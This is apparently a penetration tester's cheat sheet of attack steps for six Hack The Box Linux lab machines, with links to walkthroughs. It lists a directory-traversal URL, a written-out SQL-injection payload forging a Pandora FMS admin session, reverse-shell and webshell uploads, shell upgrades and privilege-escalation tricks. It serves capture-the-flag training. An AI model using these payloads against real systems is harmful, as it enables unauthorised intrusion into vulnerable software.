# Lin-Backdoor
https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html
```
http://10.10.11.125/wp-content/plugins/
WordPress Plugin eBook Download 1.1 - Directory Traversal
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/812/cmdline
GNU gdbserver 9.2 - Remote Command Execution (RCE)
ps aux
screen -x root/root
```


# Lin-Pandora
```
nmap -sU -T5 10.10.11.136
snmpwalk -v 1 -c public 10.10.11.136
ssh daniel@10.10.11.136
ssh -D 9090 daniel@10.10.11.136
http://localhost/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
Upload - php-reverse-shell.php
./LinEnum.sh
cat .ssh/id_rsa.pub
SUID - /usr/bin/pandora_backup
```


# Lin-Bashed
https://0xdf.gitlab.io/2018/04/29/htb-bashed.html
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.68/FUZZ -fc 403 -e .aspx,.php,.txt,.html
/dev/phpbash.php
reverse shell - python
python3 -c "import pty;pty.spawn('/bin/bash')"
sudo -l
sudo -u scriptmanager bash -i
python -c shell.py
```


# Lin-SolidState
https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
```
nc 10.10.10.51 4555
telnet 10.10.10.51 110
Escape rbash
LinEnum.sh
reverse shell - nc
move to bash
```


# Lin-Jarvis
https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
```
SQL injection
Webshell
sudo -l
Reverse Shell - Bash
LinEnum.sh
PrivEsc - systemctl
```


# Lin-Haircut
```
/exposed.php
php-reverse-shell
10.10.10.24/uploads/shell2.php
LinEnum.sh
screen 4.5.0
```


